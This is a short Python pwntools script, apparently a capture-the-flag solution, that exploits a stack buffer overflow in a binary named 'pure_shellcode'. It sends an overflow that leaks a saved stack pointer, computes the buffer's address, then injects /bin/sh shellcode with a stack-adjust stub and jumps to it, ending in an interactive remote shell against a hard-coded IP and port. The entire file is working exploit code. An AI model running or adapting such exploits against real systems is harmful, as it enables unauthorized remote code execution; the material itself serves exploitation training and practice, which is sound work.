from pwn import *
# from hexdump import hexdump

upk = lambda x : unpack(x, 'all', endian='little', sign=False)

context(arch='amd64', os='linux', terminal='gnome-terminal')

shellcode = asm(shellcraft.sh())

main_addr = 0x4000d4

# io = process('./pure_shellcode')
io = remote("141.85.224.102", 31337)
# sleep(5)


# 1) leak stack -> call main -> compute buffer address from initial rsp
payload = "A" * 72 + p64(main_addr)
io.send(payload)
leak = io.recv()

# hexdump(leak); print

# stack = buf(64) | rbp_main | ret_main | *saved_rsp
saved_rsp = upk(leak[64+8+8:][:8])
# go back buffer length (64), skipping rbp and ret (2 * 8 bytes)
buf_addr = saved_rsp - 64 - 8 - 8


# 2) shellcode + pad + jump to buffer

# move stack pointer so we don't overwrite code !
"""
nop
nop
add rsp, 0x40
"""
move_stack = "\x90\x90\x48\x83\xC4\x40"
payload = move_stack + shellcode + "A" * (72 - len(shellcode) - len(move_stack)) + p64(buf_addr)

io.send(payload)

x = io.recv()
# hexdump(x)

io.interactive()

